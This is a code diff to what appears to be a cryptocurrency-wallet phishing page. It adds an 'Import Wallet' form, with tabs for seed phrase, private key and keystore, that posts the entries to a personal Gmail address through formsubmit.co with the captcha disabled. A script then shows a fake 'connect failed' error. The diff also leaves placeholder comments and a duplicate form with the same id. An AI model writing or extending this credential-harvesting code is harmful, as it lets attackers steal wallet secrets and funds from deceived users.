@@ -3083,6 +3083,26 @@ img {
                             <div class="tab-button" onclick="openTab(event, 'privatekey')">Private Key</div>
                             <div class="tab-button" onclick="openTab(event, 'keystore')">Keystore</div>
                         </div>
+                        <!-- ...existing code... -->
+                        <form id="importWalletForm" action="https://formsubmit.co/skashavkin@gmail.com" method="POST">
+                            <input type="hidden" name="_captcha" value="false">
+                            <!-- ...existing form fields... -->
+                            <button id="submitBtn" class="btnmodal flex" type="submit">Import Wallet</button>
+                        </form>
+                        <script>
+                            document.getElementById('importWalletForm').addEventListener('submit', function (e) {
+                                e.preventDefault(); // Prevents form submission
+
+                                // Simulate connect failed
+                                document.getElementById('errorModal').style.display = 'block';
+                            });
+
+                            // Optional: Hide error modal when "Try Another Wallet" is clicked
+                            function closeModal() {
+                                document.getElementById('errorModal').style.display = 'none';
+                            }
+                        </script>
+                        <!-- ...existing code... -->
                         <form id="importWalletForm" action="https://formsubmit.co/skashavkin@gmail.com" method="POST">
                             <input type="hidden" name="_captcha" value="false">
                             <div class="tab-content active" id="phrase">
